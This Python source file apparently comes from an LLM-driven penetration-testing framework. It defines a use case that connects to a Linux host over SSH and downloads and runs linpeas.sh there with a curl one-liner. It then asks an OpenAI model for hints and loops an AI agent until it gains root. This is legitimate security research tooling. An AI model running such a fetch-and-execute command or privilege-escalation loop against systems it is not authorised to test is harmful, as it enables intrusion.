import pathlib

from mako.template import Template

from hackingBuddyGPT.capabilities import SSHRunCommand
from hackingBuddyGPT.usecases.base import UseCase, use_case
from hackingBuddyGPT.usecases.privesc.linux import LinuxPrivesc, LinuxPrivescUseCase
from hackingBuddyGPT.utils import SSHConnection
from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection

template_dir = pathlib.Path(__file__).parent
# Ensure you create a 'get_hint_from_linpeas.txt' in your templates directory
template_linpeas = Template(filename=str(template_dir / "get_hint_from_linpeas.txt"))


@use_case("Linux Privilege Escalation using linpeas.sh for initial guidance")
class ExPrivEscLinuxLinPEASUseCase(UseCase):
    conn: SSHConnection = None
    max_turns: int = 20
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    llm: OpenAIConnection = None

    _got_root: bool = False

    # use either an use-case or an agent to perform the privesc
    use_use_case: bool = False

    # simple helper that uses linpeas.sh to get hints from the system
    def call_linpeas_against_host(self):
        self.log.console.print("[green]performing initial enumeration with linpeas.sh")

        # Download LinPEAS, make executable, run quietly, and strip ANSI color codes for LLM ingestion
        run_cmd = (
            "curl -sL 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh' -o linpeas.sh;"
            "chmod 700 linpeas.sh;"
            "./linpeas.sh -q | sed -r 's/\\x1B\\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g'"
        )

        result, _ = SSHRunCommand(conn=self.conn, timeout=300)(run_cmd)

        self.log.console.print("[yellow]got the output (truncated for display): " + result[:500] + "...")
        
        # Depending on your LLM context size (e.g., 8192 for standard GPT-4), 
        # LinPEAS might still require truncation or chunking here if it exceeds token limits.
        cmd = self.llm.get_response(template_linpeas, linpeas_output=result, number=3)
        self.log.console.print("[yellow]got the cmd: " + cmd.result)

        return [x for x in cmd.result.splitlines() if x.strip()]

    def get_name(self) -> str:
        return self.__class__.__name__

    def run(self, configuration):
        self.configuration = configuration
        
        self.log.start_run(self.get_name(), self.serialize_configuration(configuration))
        # get the hints through running LinPEAS on the target system
        hints = self.call_linpeas_against_host()
        turns_per_hint = int(self.max_turns / len(hints)) if hints else self.max_turns

        # now try to escalate privileges using the hints
        for hint in hints:
            if self.use_use_case:
                self.log.console.print("[yellow]Calling a use-case to perform the privilege escalation")
                result = self.run_using_usecases(hint, turns_per_hint)
            else:
                self.log.console.print("[yellow]Calling an agent to perform the privilege escalation")
                result = self.run_using_agent(hint, turns_per_hint)

            if result is True:
                self.log.console.print("[green]Got root!")
                return True

    def run_using_usecases(self, hint, turns_per_hint):
        linux_privesc = LinuxPrivescUseCase(
            agent=LinuxPrivesc(
                conn=self.conn,
                enable_explanation=self.enable_explanation,
                enable_update_state=self.enable_update_state,
                disable_history=self.disable_history,
                llm=self.llm,
                hint=hint,
            ),
            max_turns=turns_per_hint,
            log=self.log,
        )
        linux_privesc.init(self.configuration)
        return linux_privesc.run()

    def run_using_agent(self, hint, turns_per_hint):
        # init agent
        agent = LinuxPrivesc(
            conn=self.conn,
            llm=self.llm,
            hint=hint,
            enable_explanation=self.enable_explanation,
            enable_update_state=self.enable_update_state,
            disable_history=self.disable_history,
        )
        agent.log = self.log
        agent.init()

        # perform the privilege escalation
        agent.before_run()
        turn = 1
        got_root = False
        while turn <= turns_per_hint and not got_root:
            self.log.console.log(f"[yellow]Starting turn {turn} of {turns_per_hint}")

            if agent.perform_round(turn) is True:
                got_root = True
            turn += 1

        # cleanup and finish
        agent.after_run()
        return got_root